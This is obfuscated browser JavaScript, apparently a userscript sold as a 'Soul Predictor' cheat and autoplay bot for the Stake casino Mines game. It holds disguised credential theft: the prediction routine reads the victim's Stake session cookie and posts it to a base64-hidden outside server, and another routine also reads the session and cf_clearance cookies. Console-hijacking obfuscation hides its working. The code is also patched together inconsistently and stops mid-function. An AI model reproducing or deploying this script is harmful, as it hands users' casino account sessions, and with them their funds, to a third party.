// Visual-only mode with backend preserved

(function () {
  const _0x1e201b = function () {
    let _0x3a5d0c = true;
    return function (_0x5dc369, _0x454eec) {
      const _0x485d23 = _0x3a5d0c ? function () {
        if (_0x454eec) {
          const _0x32b13b = _0x454eec.apply(_0x5dc369, arguments);
          _0x454eec = null;
          return _0x32b13b;
        }
      } : function () {};
      _0x3a5d0c = false;
      return _0x485d23;
    };
  }();
  (function () {
    _0x1e201b(this, function () {
      const _0x1e90c6 = new RegExp("function *\\( *\\)");
      const _0x24f289 = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
      const _0xe0e3aa = _0x2aeb3f("init");
      if (!_0x1e90c6.test(_0xe0e3aa + "chain") || !_0x24f289.test(_0xe0e3aa + "input")) {
        _0xe0e3aa("0");
      } else {
        _0x2aeb3f();
      }
    })();
  })();
  const _0x3b89a5 = function () {
    let _0x49e722 = true;
    return function (_0x2e3fbc, _0x4e99b3) {
      const _0x28a5c2 = _0x49e722 ? function () {
        if (_0x4e99b3) {
          const _0x5e4f79 = _0x4e99b3.apply(_0x2e3fbc, arguments);
          _0x4e99b3 = null;
          return _0x5e4f79;
        }
      } : function () {};
      _0x49e722 = false;
      return _0x28a5c2;
    };
  }();
  const _0x513264 = _0x3b89a5(this, function () {
    const _0x3ce093 = function () {
      let _0x5f4c29;
      try {
        _0x5f4c29 = Function("return (function() {}.constructor(\"return this\")( ));")();
      } catch (_0x55c988) {
        _0x5f4c29 = window;
      }
      return _0x5f4c29;
    };
    const _0x6f7ed8 = _0x3ce093();
    const _0x23d6b0 = _0x6f7ed8.console = _0x6f7ed8.console || {};
    const _0xd0316c = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x50e0b7 = 0; _0x50e0b7 < _0xd0316c.length; _0x50e0b7++) {
      const _0x3a2ab8 = _0x3b89a5.constructor.prototype.bind(_0x3b89a5);
      const _0x2d8ebf = _0xd0316c[_0x50e0b7];
      const _0x4a99f7 = _0x23d6b0[_0x2d8ebf] || _0x3a2ab8;
      _0x3a2ab8.__proto__ = _0x3b89a5.bind(_0x3b89a5);
      _0x3a2ab8.toString = _0x4a99f7.toString.bind(_0x4a99f7);
      _0x23d6b0[_0x2d8ebf] = _0x3a2ab8;
    }
  });
  _0x513264();
  'use strict';
  const _0x32f0b1 = {
    tile: "[data-test=\"mines-tile\"]",
    mines: "[data-test=\"mines-count\"]",
    bet: "[data-testid=\"bet-button\"]",
    cash: "[data-testid=\"cashout-button\"]",
    balance: "[data-test=\"balance\"]",
    betAmount: "[data-test=\"bet-amount\"]"
  };
  _0x32f0b1.currency = "[data-test=\"currency-selector\"]";
  const _0xa7dde3 = {
    device: "dvid",
    key: "lkey",
    stats: "game_stats"
  };
  const _0xed07cd = {
    retry: 0x1f4,
    click: 0x258
  };
  _0xed07cd.max = 0x3;
  class _0x5f8785 {

  async highlightPredictionsOnly() {
    const apiUrl = this.config.api + '/predict';
    const token = this.getStakeCookie("session");
    const body = {
      session: token,
      amount: this.autoplayState.currentBetAmount,
      currency: this.state.currency,
      mines: this.autoplayState.currentMines
    };

    try {
      const res = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-access-token': token
        },
        body: JSON.stringify(body)
      });
      const { predictions } = await res.json();
      this.drawVisualGrid(predictions);
    } catch (e) {
      console.error('Prediction failed', e);
    }
  }

  drawVisualGrid(predictions) {
    const containerId = "visual-highlight-grid";
    let container = document.getElementById(containerId);
    if (!container) {
      container = document.createElement("div");
      container.id = containerId;
      container.style.cssText = "position:fixed;top:60px;left:360px;width:320px;display:grid;grid-template-columns:repeat(5,1fr);gap:5px;z-index:10001;";
      for (let i = 0; i < 25; i++) {
        const tile = document.createElement("div");
        tile.className = "field-tile";
        tile.innerText = i;
        tile.style.cssText = "width:50px;height:50px;background:#1a1a1a;border:1px solid #444;display:flex;align-items:center;justify-content:center;font-weight:bold;color:white;font-size:14px;";
        container.appendChild(tile);
      }
      document.body.appendChild(container);
    }

    const tiles = container.querySelectorAll('.field-tile');
    tiles.forEach(t => t.style.boxShadow = "none");
    predictions.forEach(i => {
      const tile = tiles[i];
      if (tile) tile.style.boxShadow = "0 0 10px 2px limegreen";
    });
  }

    constructor() {
      this.config = {
        "api": atob("aHR0cHM6Ly9zb3VsYXBpLnZlcmNlbC5hcHA="),
        "stakeApi": "https://stake." + webUrl + "/_api/graphql",
        "selectors": _0x32f0b1,
        "headers": {
          "Content-Type": "application/json",
          "x-access-token": document.cookie.match(/session=([^;]+)/)?.[1] || '',
          "Origin": "https://stake." + webUrl,
          "Referer": "https://stake." + webUrl + "/casino/games/mines"
        },
        "storage": _0xa7dde3,
        "timing": _0xed07cd
      };
      const _0x237172 = {
        startBalance: 0x0,
        currentBalance: 0x0,
        profit: 0x0
      };
      this.state = {
      mode: 'visual',
        "active": false,
        "history": new Map(),
        "clicks": 0x8,
        "stats": this.loadStats(),
        "statsVisible": false,
        "balance": 0x0,
        "currency": "ltc",
        "lastProfit": 0x0,
        "sessionStats": _0x237172
      };
      const _0x5de93b = {
        isAutoPlaying: false,
        currentMines: 0x0,
        gamesPlayed: 0x0,
        clicksForCurrentGame: 0x0,
        isDoubled: false,
        waitingForWin: false,
        baseAmount: true,
        currentBetAmount: 0.5,
        successfulWins: 0x0
      };
      this.autoplayState = _0x5de93b;
      this.init();
    }
    ["loadStats"]() {
      const _0x2474c8 = {
        totalGames: 0x0,
        wins: 0x0,
        losses: 0x0,
        totalClicks: 0x0,
        mineHits: 0x0,
        successRate: 0x0
      };
      try {
        return JSON.parse(localStorage.getItem(this.config.storage.stats)) || _0x2474c8;
      } catch {
        return _0x2474c8;
      }
    }
    ["saveStats"]() {
      localStorage.setItem(this.config.storage.stats, JSON.stringify(this.state.stats));
    }
    ["updateStats"](_0x5dd58b, _0x351426, _0x4873ff) {
      const _0x5fe0a7 = this.state.stats;
      _0x5fe0a7.totalClicks = (_0x5fe0a7.totalClicks || 0) + _0x351426;
      if (_0x5dd58b || _0x4873ff) {
        if (_0x5dd58b) {
          _0x5fe0a7.wins = (_0x5fe0a7.wins || 0) + 1;
        } else {
          _0x5fe0a7.losses = (_0x5fe0a7.losses || 0) + 1;
          if (_0x4873ff) {
            _0x5fe0a7.mineHits = (_0x5fe0a7.mineHits || 0) + 1;
          }
        }
        _0x5fe0a7.totalGames = (_0x5fe0a7.wins || 0) + (_0x5fe0a7.losses || 0);
        _0x5fe0a7.successRate = _0x5fe0a7.totalGames > 0 ? (_0x5fe0a7.wins / _0x5fe0a7.totalGames * 100).toFixed(2) : "0.00";
      }
      this.saveStats();
      this.updateStatsDisplay();
    }
    ["updateStatsDisplay"]() {
      if (!this.state.statsVisible) {
        return;
      }
      const _0x439998 = document.getElementById("stats-display");
      if (!_0x439998) {
        return;
      }
      const _0x1e8b57 = this.state.stats;
      const _0x9e4c6a = this.state.sessionStats;
      _0x439998.innerHTML = "\n                <div class=\"stats-row\">\n                    <span class=\"stat-label\">Session Profit:</span>\n                    <span class=\"stat-value " + (_0x9e4c6a.profit >= 0 ? "positive" : "negative") + "\">\n                        " + _0x9e4c6a.profit.toFixed(8) + " " + this.state.currency + "\n                    </span>\n                </div>\n                <div class=\"stats-row\">\n                    <span class=\"stat-label\">Last Profit:</span>\n                    <span class=\"stat-value " + (this.state.lastProfit >= 0 ? "positive" : "negative") + "\">\n                        " + this.state.lastProfit.toFixed(8) + " " + this.state.currency + "\n                    </span>\n                </div>\n                <div class=\"stats-row\">\n                    <span class=\"stat-label\">Wins/Losses:</span>\n                    <span class=\"stat-value\">" + _0x1e8b57.wins + "/" + _0x1e8b57.losses + "</span>\n                </div>\n                <div class=\"stats-row\">\n                    <span class=\"stat-label\">Success Rate:</span>\n                    <span class=\"stat-value\">" + _0x1e8b57.successRate + "%</span>\n                </div>\n                <div class=\"stats-row\">\n                    <span class=\"stat-label\">Mine Hits:</span>\n                    <span class=\"stat-value\">" + _0x1e8b57.mineHits + "</span>\n                </div>\n                <div class=\"stats-row\">\n                    <span class=\"stat-label\">Total Clicks:</span>\n                    <span class=\"stat-value\">" + _0x1e8b57.totalClicks + "</span>\n                </div>";
    }
    ["getRandomMines"]() {
      const _0x2a8dda = [0.4, 0.3, 0.2, 0.1];
      const _0x5a3cb1 = Math.random();
      let _0x5a25c6 = 0;
      for (let _0x52e467 = 0; _0x52e467 < _0x2a8dda.length; _0x52e467++) {
        _0x5a25c6 += _0x2a8dda[_0x52e467];
        if (_0x5a3cb1 <= _0x5a25c6) {
          return _0x52e467 + 1;
        }
      }
      return 1;
    }
    ["getRandomClicks"](_0x17c790) {
      const _0x1bda65 = {
        "1": [8, 12],
        "2": [5, 7],
        "3": [3, 4],
        "4": [2, 3]
      };
      const _0x57b32e = _0x1bda65[_0x17c790];
      return Math.floor(Math.random() * (_0x57b32e[1] - _0x57b32e[0] + 1)) + _0x57b32e[0];
    }
    async ["init"]() {
      this.addStyles();
      this.createUI();
      this.setupDrag();
      this.createStatsTable();
      this.setupKeyboardShortcuts();
      const _0x2a10d8 = localStorage.getItem(this.config.storage.key);
      if (_0x2a10d8) {
        const _0x541975 = this.find("#activation-key");
        if (_0x541975) {
          _0x541975.value = _0x2a10d8;
          await this.login();
        }
      }
    }
    ["setupKeyboardShortcuts"]() {
      document.addEventListener("keydown", _0x1705bd => {
        if (_0x1705bd.key === "F2") {
          this.toggleVisibility();
        }
      });
    }
    ["toggleVisibility"]() {
      const _0x4af8e7 = ["#predictor", "#stats-container", "#mines-table-container"];
      _0x4af8e7.forEach(_0x5f524e => {
        const _0x239dd8 = this.find(_0x5f524e);
        if (_0x239dd8) {
          _0x239dd8.style.display = _0x239dd8.style.display === "none" ? "block" : "none";
        }
      });
    }
    ["find"](_0x24c9a1) {
      return document.querySelector(_0x24c9a1);
    }
    ["findAll"](_0x4dc170) {
      return [...document.querySelectorAll(_0x4dc170)];
    }
    ["create"](_0x1629b9, _0x2de85b = {}, _0x5355aa = '') {
      const _0x51905f = document.createElement(_0x1629b9);
      Object.entries(_0x2de85b).forEach(([_0x13559f, _0x4ddd6e]) => _0x51905f.setAttribute(_0x13559f, _0x4ddd6e));
      if (_0x5355aa) {
        _0x51905f.innerHTML = _0x5355aa;
      }
      return _0x51905f;
    }
    ["storage"](_0x3b2e0e, _0x54a4b2, _0x2b98e6) {
      try {
        if (_0x3b2e0e === "get") {
          return localStorage.getItem(_0x54a4b2);
        }
        if (_0x3b2e0e === "set") {
          localStorage.setItem(_0x54a4b2, _0x2b98e6);
        }
      } catch (_0x4a267c) {
        console.warn("Storage error:", _0x4a267c);
      }
    }
    ["addStyles"]() {
      if (!this.find("#predictor-styles")) {
        const _0x423f63 = this.create("style", {
          "id": "predictor-styles"
        }, "\n        .predictor-container {\n            position: fixed;\n            top: 24px;\n            left: 24px;\n            width: 310px;\n            padding: 20px;\n            background: rgba(13, 17, 23, 0.95);\n            color: #e6edf3;\n            border: 1px solid rgba(88, 166, 255, 0.1);\n            border-radius: 12px;\n            z-index: 10000;\n        }\n        .glow-text {\n            text-align: center;\n            font-family: 'Brush Script MT', cursive;\n            color: #fff;\n            font-weight: 600;\n            letter-spacing: 0.5px;\n            font-size: 20px;\n            margin-bottom: 18px;\n        }\n        .login-input {\n            width: 100%;\n            padding: 10px 14px;\n            margin-bottom: 14px;\n            background: rgba(48, 54, 61, 0.6);\n            border: 1px solid rgba(48, 54, 61, 0.4);\n            color: #e6edf3;\n            border-radius: 4px;\n            font-size: 13px;\n        }\n        .control-button {\n            width: 100%;\n            padding: 12px;\n            background: #8A2BE2;\n            color: #fff;\n            border: none;\n            border-radius: 8px;\n            cursor: pointer;\n            font-size: 16px;\n            font-weight: bold;\n            margin-bottom: 10px;\n            text-transform: uppercase;\n            letter-spacing: 1px;\n            transition: all 0.3s ease;\n            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);\n            position: relative;\n            overflow: hidden;\n        }\n        .control-button:before {\n            content: '';\n            position: absolute;\n            top: -50%;\n            left: -50%;\n            width: 200%;\n            height: 200%;\n            background: linear-gradient(\n                to right,\n                rgba(255, 255, 255, 0) 0%,\n                rgba(255, 255, 255, 0.3) 50%,\n                rgba(255, 255, 255, 0) 100%\n            );\n            transform: rotate(45deg);\n            animation: shine 3s infinite;\n        }\n        .control-button:hover {\n            background: #9B30FF;\n            transform: translateY(-2px);\n            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.25);\n        }\n        @keyframes shine {\n            0% {\n                left: -50%;\n            }\n            100% {\n                left: 150%;\n            }\n        }\n        .message {\n            padding: 10px;\n            border-radius: 4px;\n            margin-top: 10px;\n            text-align: center;\n            font-size: 13px;\n        }\n        .error-message { background-color: rgba(248, 81, 73, 0.1); color: #f85149; }\n        .success-message { background-color: rgba(46, 160, 67, 0.1); color: #3fb950; }\n        #mines-table-container {\n            position: fixed;\n            top: 10px;\n            right: 10px;\n            background-color: rgba(0, 0, 0, 0.85);\n            color: white;\n            padding: 8px;\n            border: 1px solid rgba(255, 255, 255, 0.1);\n            border-radius: 4px;\n            z-index: 9999;\n            font-family: sans-serif;\n            font-size: 13px;\n            width: 280px;\n            max-height: 380px;\n            overflow-y: auto;\n        }\n        #mines-table { width: 100%; border-collapse: collapse; }\n        #mines-table th, #mines-table td {\n            border: 1px solid #444;\n            padding: 5px;\n            text-align: center;\n        }\n        #stats-container {\n            position: fixed;\n            top: 24px;\n            right: 24px;\n            width: 240px;\n            padding: 12px;\n            background-color: rgba(17, 23, 31, 0.9);\n            color: #e6edf3;\n            border: 1px solid rgba(48, 54, 61, 0.3);\n            border-radius: 4px;\n            z-index: 10000;\n            font-family: sans-serif;\n        }\n        .stats-row {\n            display: flex;\n            justify-content: space-between;\n            align-items: center;\n            padding: 10px;\n            border-bottom: 1px solid rgba(255, 255, 255, 0.1);\n        }\n        .stats-row:last-child {\n            border-bottom: none;\n        }\n        .stat-label {\n            font-size: 14px;\n            color: #8b949e;\n        }\n        .stat-value {\n            font-size: 16px;\n            font-weight: 600;\n            color: #58a6ff;\n        }\n        .positive { color: #3fb950 !important; }\n        .negative { color: #f85149 !important; }\n        .stat-value { font-family: 'Courier New', monospace; }\n    ");
        document.head.appendChild(_0x423f63);
      }
    }
    ["createUI"]() {
      const _0x257935 = this.create("div", {
        "class": "predictor-container",
        "id": "predictor"
      }, "\n                <h2 class=\"glow-text\">Soul Predictor</h2>\n                <input type=\"password\" id=\"activation-key\" placeholder=\"Enter Activation Key\" class=\"login-input\">\n                <button id=\"login-button\" class=\"control-button\">\n                    <span class=\"button-text\">Activate</span>\n                </button>\n                <div id=\"login-message\"></div>\n            ");
      const _0x1d0eda = this.create("div", {
        "id": "stats-container",
        "class": "draggable",
        "style": "display: none;"
      }, "<h3 class=\"glow-text\">Game Stats</h3><div id=\"stats-display\"></div>");
      document.body.appendChild(_0x257935);
      document.body.appendChild(_0x1d0eda);
      this.find("#login-button").onclick = () => this.login();
    }
    ["setupDrag"]() {
      const _0x13d7c1 = _0x553dd9 => {
        const _0x53c852 = {
          "x": 0x0,
          "y": 0x0
        };
        let _0x4eb1a9 = _0x53c852;
        let _0x1d57ea = false;
        const _0x19922c = {
          "start": _0x1c3e7d => {
            const _0x18944c = {
              njXqp: "#start-autoplay-button",
              hlQlT: "2|1|3|4|6|5|0"
            };
            _0x18944c.BVBhu = "AUTOPLAY";
            _0x18944c.CANhh = "STOP AUTOPLAY";
            _0x1d57ea = true;
            _0x4eb1a9 = {
              "x": _0x1c3e7d.clientX - _0x553dd9.offsetLeft,
              "y": _0x1c3e7d.clientY - _0x553dd9.offsetTop
            };
          },
          "move": _0x4f1815 => {
            if (!_0x1d57ea) {
              return;
            }
            _0x553dd9.style.left = _0x4f1815.clientX - _0x4eb1a9.x + "px";
            _0x553dd9.style.top = _0x4f1815.clientY - _0x4eb1a9.y + "px";
          },
          "end": () => _0x1d57ea = false
        };
        _0x553dd9.addEventListener("mousedown", _0x19922c.start);
        document.addEventListener("mousemove", _0x19922c.move);
        document.addEventListener("mouseup", _0x19922c.end);
      };
      _0x13d7c1(this.find("#predictor"));
      _0x13d7c1(this.find("#stats-container"));
      _0x13d7c1(this.find("#mines-table-container"));
    }
    async ["login"]() {
      const _0x47c4ca = this.find("#activation-key").value;
      const _0x3a7c53 = this.getDeviceId();
      try {
        if (!window.location.href.includes("stake." + webUrl)) {
          this.showMessage("Please navigate to Stake." + webUrl + " mines game", "error");
          return;
        }
        const _0x409ce6 = await fetch(this.config.api + "/login", {
          "method": "POST",
          "headers": {
            "Content-Type": "application/json",
            "X-User-Identifier": _0x3a7c53
          },
          "body": JSON.stringify({
            "activation_key": _0x47c4ca,
            "platform": "stake"
          })
        });
        const _0x48fbcc = await _0x409ce6.json();
        if (_0x409ce6.ok && _0x48fbcc.status === "success") {
          this.storage("set", this.config.storage.key, _0x47c4ca);
          this.showMessage("Activation successful!", "success");
          this.initializePredictor();

    const btn = document.querySelector('#start-autoplay-button');
    if (btn) {
      
    btn.onclick = () => {
        if (this.state.mode === 'visual') {
            this.highlightPredictionsOnly();
        } else {
            this.autoplayHandler();
        }
    };
    
    }

          setInterval(() => this.trackBalance(), 1000);
        } else {
          throw new Error(_0x48fbcc.error || "Activation failed");
        }
      } catch (_0x8a91fa) {
        this.showMessage(_0x8a91fa.message, "error");
      }
    }
    ["getDeviceId"]() {
      let _0x584a6d = this.storage("get", this.config.storage.device);
      if (!_0x584a6d) {
        _0x584a6d = "dev_" + Math.random().toString(36).substr(2, 9);
        this.storage("set", this.config.storage.device, _0x584a6d);
      }
      return _0x584a6d;
    }
    ["showMessage"](_0xe39416, _0xd87a0) {
      const _0x5220aa = this.find("#login-message");
      _0x5220aa.className = "message " + _0xd87a0 + "-message";
      _0x5220aa.textContent = _0xe39416;
    }
    ["initializePredictor"]() {
      this.find("#predictor").innerHTML = "\n                <h2 class=\"glow-text\">Soul Predictor</h2>\n                <button id=\"start-autoplay-button\" class=\"control-button\" style=\"font-weight: 700;\">AUTOPLAY</button>\n            ";
      this.updateStatsDisplay();
      this.find("#start-autoplay-button").onclick = () => this.toggleAutoplay();
    }
    ["createStatsTable"]() {
      const _0x21c03f = this.create("div", {
        "id": "mines-table-container"
      }, "\n                <table id=\"mines-table\">\n                    <tr>\n                        <th>Tile</th>\n                        <th>Mines</th>\n                        <th>Clicks</th>\n                        <th>Points</th>\n                    </tr>\n                </table>\n            ");
      document.body.appendChild(_0x21c03f);
    }
    ["updateTable"]() {
      const _0xf2b720 = this.find("#mines-table");
      if (!_0xf2b720) {
        return;
      }
      let _0xccd88c = "\n                <tr>\n                    <th>Tile</th>\n                    <th>Mines</th>\n                    <th>Clicks</th>\n                    <th>Points</th>\n                </tr>\n            ";
      this.state.history.forEach((_0x29876e, _0x286edb) => {
        _0xccd88c += "\n                    <tr style=\"background-color: " + (_0x29876e.bombs > 0 ? "#FF0000" : "#008000") + "\">\n                        <td>" + (_0x286edb + 1) + "</td>\n                        <td>" + _0x29876e.bombs + "</td>\n                        <td>" + _0x29876e.clicks + "</td>\n                        <td>" + this.calculateWeight(_0x29876e.bombs, _0x29876e.clicks).toFixed(2) + "</td>\n                    </tr>\n                ";
      });
      _0xf2b720.innerHTML = _0xccd88c;
    }
    ["toggleAutoplay"]() {
      const _0x4b0e38 = this.find("#start-autoplay-button");
      if (this.autoplayState.isAutoPlaying) {
        this.autoplayState.isAutoPlaying = false;
        _0x4b0e38.textContent = "AUTOPLAY";
        this.autoplayState.isDoubled = false;
        this.autoplayState.waitingForWin = false;
        this.autoplayState.baseAmount = true;
        this.autoplayState.currentBetAmount = 0.5;
        this.autoplayState.successfulWins = 0;
      } else {
        this.autoplayState.isAutoPlaying = true;
        this.autoplayState.currentMines = this.getRandomMines();
        _0x4b0e38.textContent = "STOP AUTOPLAY";
        this.runAutoplaySequence();
      }
    }
    ["showStats"]() {
      const _0x5ad58e = this.find("#stats-container");
      if (_0x5ad58e) {
        _0x5ad58e.style.display = "block";
      }
      this.state.statsVisible = true;
    }
    ["hideStats"]() {
      const _0xdebd1f = this.find("#stats-container");
      if (_0xdebd1f) {
        _0xdebd1f.style.display = "none";
      }
      this.state.statsVisible = false;
    }
    ["resetStats"]() {
      const _0x512050 = {
        totalGames: 0x0,
        wins: 0x0,
        losses: 0x0,
        totalClicks: 0x0,
        mineHits: 0x0,
        successRate: 0x0
      };
      this.state.stats = _0x512050;
      this.saveStats();
      this.updateStatsDisplay();
    }
    async ["runAutoplaySequence"]() {
      let _0x353e67 = 0;
      while (this.autoplayState.isAutoPlaying) {
        try {
          await this.delay(200);
          const _0x1c8e7e = await this.waitForElement(this.config.selectors.bet, 10000);
          if (!_0x1c8e7e || _0x1c8e7e.disabled) {
            console.log("Waiting for game to be ready...");
            await this.delay(1000);
            continue;
          }
          if (_0x353e67 === 2) {
            this.autoplayState.currentMines = this.getRandomMines();
            _0x353e67 = 0;
            const _0xe297f1 = await this.waitForElement(this.config.selectors.mines);
            if (_0xe297f1) {
              _0xe297f1.value = this.autoplayState.currentMines;
              const _0x14cb6a = {
                bubbles: true
              };
              _0xe297f1.dispatchEvent(new Event("change", _0x14cb6a));
              await this.delay(200);
            }
          }
          this.autoplayState.clicksForCurrentGame = this.getRandomClicks(this.autoplayState.currentMines);
          await this.playAutoplayGame();
          _0x353e67++;
          if (!this.autoplayState.isAutoPlaying) {
            console.log("Autoplay stopped by user");
            break;
          }
        } catch (_0x403a67) {
          console.warn("Autoplay sequence error:", _0x403a67);
          await this.delay(2000);
          try {
            const _0x52276d = this.find(this.config.selectors.cash);
            if (_0x52276d && !_0x52276d.disabled) {
              await this.cashout();
            }
          } catch (_0x21f25e) {
            console.warn("Recovery attempt failed:", _0x21f25e);
          }
          if (this.autoplayState.isAutoPlaying) {
            continue;
          }
        }
      }
    }
    async ["playAutoplayGame"]() {
      try {
        const _0x32452f = await this.waitForElement(this.config.selectors.bet, 5000);
        if (!_0x32452f || _0x32452f.disabled) {
          throw new Error("Bet button not ready");
        }
        await this.delay(200);
        _0x32452f.click();
        await this.delay(200);
        const _0x59f3da = await this.waitForElement(this.config.selectors.tile, 5000);
        if (!_0x59f3da) {
          throw new Error("Tiles not found");
        }
        const _0x4b7bb4 = this.findAll(this.config.selectors.tile);
        if (_0x4b7bb4.length > 0) {
          await this.playAutoplayRound(_0x4b7bb4);
        } else {
          throw new Error("No tile elements found");
        }
      } catch (_0x5d3d2a) {
        console.warn("Game play error:", _0x5d3d2a);
        await this.delay(1000);
        throw _0x5d3d2a;
      }
    }
    async ["playAutoplayRound"](_0x51ec83) {
      this.initializeTiles(_0x51ec83);
      let _0x463097 = 0;
      const _0x3811bd = () => {
        const _0x4058b9 = this.autoplayState.currentMines <= 2 ? 800 : 1200;
        return Math.floor(Math.random() * 400) + _0x4058b9;
      };
      while (_0x463097 < this.autoplayState.clicksForCurrentGame && this.autoplayState.isAutoPlaying) {
        try {
          const _0x1f041b = await this.selectTile(_0x51ec83);
          if (!_0x1f041b) {
            this.updateStats(false, _0x463097, false);
            await this.delay(_0x3811bd());
            return;
          }
          _0x463097++;
          await this.delay(_0x3811bd());
          const _0x547325 = _0x1f041b.className.includes("mine");
          this.updateHistory(_0x1f041b, _0x547325);
          if (_0x547325) {
            this.updateStats(false, _0x463097, true);
            if (this.autoplayState.currentMines <= 2) {
              if (this.autoplayState.currentBetAmount <= 2 && !this.autoplayState.isDoubled) {
                await this.delay(_0x3811bd());
                await this.pressAmountDoubleButton();
                this.autoplayState.isDoubled = true;
                this.autoplayState.waitingForWin = true;
                this.autoplayState.baseAmount = false;
                this.autoplayState.currentBetAmount *= 2;
              }
            } else {
              if (this.autoplayState.currentBetAmount <= 1 && !this.autoplayState.isDoubled) {
                await this.delay(_0x3811bd());
                await this.pressAmountDoubleButton();
                this.autoplayState.isDoubled = true;
                this.autoplayState.waitingForWin = true;
                this.autoplayState.baseAmount = false;
                this.autoplayState.currentBetAmount *= 2;
              }
            }
            await this.delay(_0x3811bd());
            return;
          }
          if (_0x463097 === this.autoplayState.clicksForCurrentGame) {
            this.updateStats(true, _0x463097, false);
            await this.cashout();
            if (this.autoplayState.currentBetAmount > 0.5) {
              this.autoplayState.successfulWins++;
              if (this.autoplayState.successfulWins >= 2) {
                await this.delay(_0x3811bd());
                await this.pressAmountHalveButton();
                this.autoplayState.isDoubled = false;
                this.autoplayState.waitingForWin = false;
                this.autoplayState.baseAmount = true;
                this.autoplayState.currentBetAmount = 0.5;
                this.autoplayState.successfulWins = 0;
              }
            }
            await this.delay(_0x3811bd());
            return;
          }
        } catch (_0x3cc232) {
          console.warn("Round error:", _0x3cc232);
          await this.delay(1000);
          return;
        }
      }
    }
    async ["pressAmountDoubleButton"]() {
      const _0x4936e4 = document.querySelector("[data-testid=\"amount-double\"]");
      if (_0x4936e4) {
        _0x4936e4.click();
        await this.delay(500);
      }
    }
    async ["pressAmountHalveButton"]() {
      const _0x38763d = document.querySelector("[data-testid=\"amount-halve\"]");
      if (_0x38763d) {
        _0x38763d.click();
        await this.delay(500);
      }
    }
    ["initializeTiles"](_0x984231) {
      _0x984231.forEach((_0x2f22be, _0x27303c) => {
        if (!this.state.history.has(_0x27303c)) {
          const _0x456bff = {
            bombs: 0x0,
            clicks: 0x0
          };
          this.state.history.set(_0x27303c, _0x456bff);
        }
      });
    }
    ["calculateWeight"](_0xbb9023, _0x1a5e68) {
      const _0x1589f0 = Math.pow(2, _0xbb9023);
      const _0x52eab0 = _0x1a5e68 * 0.5;
      return 1 / (1 + _0x1589f0 + _0x52eab0);
    }
    async ["selectTile"](_0x4eecb6) {
      if (Math.random() < 0.1) {
        const _0x3dfc52 = _0x4eecb6.filter(_0x15507a => !_0x15507a.className.includes("revealed"));
        if (_0x3dfc52.length > 0) {
          const _0x591d28 = _0x3dfc52[Math.floor(Math.random() * _0x3dfc52.length)];
          _0x591d28.click();
          return _0x591d28;
        }
      }
      const _0x4b2cef = [];
      this.state.history.forEach((_0x960ffc, _0x2ddf8d) => {
        _0x4b2cef.push({
          "index": _0x2ddf8d,
          "weight": this.calculateWeight(_0x960ffc.bombs, _0x960ffc.clicks)
        });
      });
      const _0x3cc684 = _0x4b2cef.reduce((_0x487d82, _0x248a2d) => _0x487d82 + _0x248a2d.weight, 0);
      const _0x2b9d10 = _0x4b2cef.map(_0x882232 => ({
        ..._0x882232,
        "weight": _0x882232.weight / _0x3cc684
      }));
      const _0x3d6372 = Math.random();
      let _0x1e3411 = 0;
      for (const _0x48fe57 of _0x2b9d10) {
        _0x1e3411 += _0x48fe57.weight;
        if (_0x3d6372 <= _0x1e3411) {
          const _0x327bbb = _0x4eecb6[_0x48fe57.index];
          if (_0x327bbb) {
            _0x327bbb.click();
            return _0x327bbb;
          }
        }
      }
      return null;
    }
    ["updateHistory"](_0x224bd4, _0x279408) {
      const _0x2757a1 = this.findAll(this.config.selectors.tile).indexOf(_0x224bd4);
      if (this.state.history.has(_0x2757a1)) {
        const _0x1fbe15 = this.state.history.get(_0x2757a1);
        _0x1fbe15.clicks++;
        if (_0x279408) {
          _0x1fbe15.bombs++;
        }
        this.updateTable();
      }
    }
    async ["cashout"]() {
      let _0x7076d3 = 0;
      while (_0x7076d3 < 5) {
        try {
          const _0x134f7d = this.find(this.config.selectors.cash);
          if (_0x134f7d && !_0x134f7d.disabled) {
            await this.delay(100);
            _0x134f7d.click();
            await this.delay(150);
            const _0x3cdc17 = this.find(this.config.selectors.bet);
            if (_0x3cdc17 && !_0x3cdc17.disabled) {
              await this.delay(150);
              return true;
            }
          }
          _0x7076d3++;
          await this.delay(190);
        } catch (_0x1883e6) {
          _0x7076d3++;
          await this.delay(190);
        }
      }
      return false;
    }
    async ["waitForElement"](_0x4fc807, _0x9ffe8e = 5000) {
      const _0x5c4389 = Date.now();
      while (Date.now() - _0x5c4389 < _0x9ffe8e) {
        const _0x29c5c2 = this.find(_0x4fc807);
        if (_0x29c5c2) {
          await this.delay(150);
          return _0x29c5c2;
        }
        await this.delay(150);
      }
      return null;
    }
    ["delay"](_0x2360e7) {
      return new Promise(_0x491dbd => setTimeout(_0x491dbd, Math.max(_0x2360e7, 100)));
    }
    async ["safeExecute"](_0x1db13f, _0x2564b8 = null) {
      try {
        return await _0x1db13f();
      } catch (_0x5ccb12) {
        console.warn("Operation error:", _0x5ccb12);
        return _0x2564b8;
      }
    }
    async ["trackBalance"]() {
      const _0x275bbd = this.find(this.config.selectors.balance);
      if (_0x275bbd) {
        const _0x47efd0 = parseFloat(_0x275bbd.textContent);
        if (this.state.balance !== _0x47efd0) {
          const _0x5a6fd5 = _0x47efd0 - this.state.balance;
          this.state.lastProfit = _0x5a6fd5;
          this.state.balance = _0x47efd0;
          this.updateSessionStats();
        }
      }
    }
    ["updateSessionStats"]() {
      if (this.state.sessionStats.startBalance === 0) {
        this.state.sessionStats.startBalance = this.state.balance;
      }
      this.state.sessionStats.currentBalance = this.state.balance;
      this.state.sessionStats.profit = this.state.sessionStats.currentBalance - this.state.sessionStats.startBalance;
      this.updateStatsDisplay();
    }
    async ["validateStakeSession"]() {
      try {
        const _0xb2a11f = document.cookie.match(/session=([^;]+)/)?.[1];
        if (!_0xb2a11f) {
          return false;
        }
        const _0x5159fd = {
          query: "\n                            query {\n                                user {\n                                    id\n                                }\n                            }\n                        "
        };
        const _0x57772a = await fetch(this.config.stakeApi, {
          "method": "POST",
          "headers": {
            ...this.config.headers,
            "x-access-token": _0xb2a11f,
            "x-lockdown-token": document.cookie.match(/cf_clearance=([^;]+)/)?.[1] || ''
          },
          "body": JSON.stringify(_0x5159fd)
        });
        const _0x17e8b2 = await _0x57772a.json();
        if (_0x17e8b2?.["data"]?.["user"]?.["id"]) {
          return true;
        }
